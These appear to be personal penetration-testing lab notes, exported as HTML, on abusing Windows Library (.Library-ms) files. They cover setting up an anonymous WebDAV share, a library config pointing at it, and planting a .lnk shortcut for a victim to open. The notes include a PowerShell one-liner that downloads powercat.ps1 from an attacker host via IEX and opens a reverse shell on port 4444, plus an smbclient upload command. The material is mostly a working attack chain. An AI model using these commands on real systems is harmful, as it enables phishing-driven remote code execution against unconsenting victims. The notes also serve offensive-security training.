<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>Abusing Windows Library</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>Abusing Windows Library</h1><br/><p>create webdav share</p><p><div class="codebox"><pre>pip3 <span style="color:#ff9d00;font-weight:700">install</span> wsgidav<br /><br /><span style="color:#ff9d00;font-weight:700">/</span>home<span style="color:#ff9d00;font-weight:700">/</span>kali<span style="color:#ff9d00;font-weight:700">/</span>.local<span style="color:#ff9d00;font-weight:700">/</span>bin<span style="color:#ff9d00;font-weight:700">/</span>wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root <span style="color:#ff9d00;font-weight:700">/</span>home<span style="color:#ff9d00;font-weight:700">/</span>kali<span style="color:#ff9d00;font-weight:700">/</span>webdav<span style="color:#ff9d00;font-weight:700">/</span></pre></div></p><p></p><p></p><p>config</p><p><div class="codebox"><pre>&lt;?xml <span style="color:#333333;font-weight:400">version=</span><span style="color:#3ad900;font-weight:400">&quot;1.0&quot;</span> <span style="color:#333333;font-weight:400">encoding=</span><span style="color:#3ad900;font-weight:400">&quot;UTF-8&quot;</span>?&gt;<br />&lt;libraryDescription xmlns=&quot;http://schemas.microsoft.com/windows/2009/library&quot;&gt;<br />&lt;name&gt;@windows.storage.dll,-34582&lt;/name&gt;<br />&lt;version&gt;6&lt;/version&gt;<br />&lt;isLibraryPinned&gt;true&lt;/isLibraryPinned&gt;<br />&lt;iconReference&gt;imageres.dll,-1003&lt;/iconReference&gt;<br />&lt;templateInfo&gt;<br />&lt;folderType&gt;{7d49d726-3c21-4f05-99aa-fdc2c9474656}&lt;/folderType&gt;<br />&lt;/templateInfo&gt;<br />&lt;searchConnectorDescriptionList&gt;<br />&lt;searchConnectorDescription&gt;<br />&lt;isDefaultSaveLocation&gt;true&lt;/isDefaultSaveLocation&gt;<br />&lt;isSupported&gt;false&lt;/isSupported&gt;<br />&lt;simpleLocation&gt;<br />&lt;url&gt;http://192.168.119.2&lt;/url&gt;<br />&lt;/simpleLocation&gt;<br />&lt;/searchConnectorDescription&gt;<br />&lt;/searchConnectorDescriptionList&gt;<br />&lt;/libraryDescription&gt;<br /></pre></div></p><p></p><p>When we re-open our file in Visual Studio Code, we find that a new</p><p>tag appeared named serialized. The tag contains</p><p>base64-encoded information about the location of the url tag.</p><p>Additionally, the content inside the url tags has changed from</p><p><a href="http://192.168.119.2">http://192.168.119.2</a> to \\192.168.119.2\DavWWWRoot. </p><p></p><p>The goal is to start a reverse shell by putting the</p><p>.lnk shortcut file on the WebDAV share for the victim to execute.</p><p></p><p><div class="codebox"><pre>powershell.exe <span style="color:#ff9d00;font-weight:700">-</span>c <span style="color:#3ad900;font-weight:400">&quot;IEX(New-Object System.Net.WebClient).DownloadString(&#39;http://192.168.119.3:8000/powercat.ps1&#39;);<br />powercat -c 192.168.119.3 -p 4444 -e powershell&quot;</span><br /><br /><span style="color:#0088ff;font-weight:400">#than we put it on the share</span><br /><br />smbclient <span style="color:#ff9d00;font-weight:700">//</span><span style="color:#333333;font-weight:400">192.168</span>.<span style="color:#333333;font-weight:400">50.195</span><span style="color:#ff9d00;font-weight:700">/</span>share <span style="color:#ff9d00;font-weight:700">-</span>c <span style="color:#333333;font-weight:400">&#39;put config.Library-ms&#39;</span></pre></div></p></div>
</body>
</html>
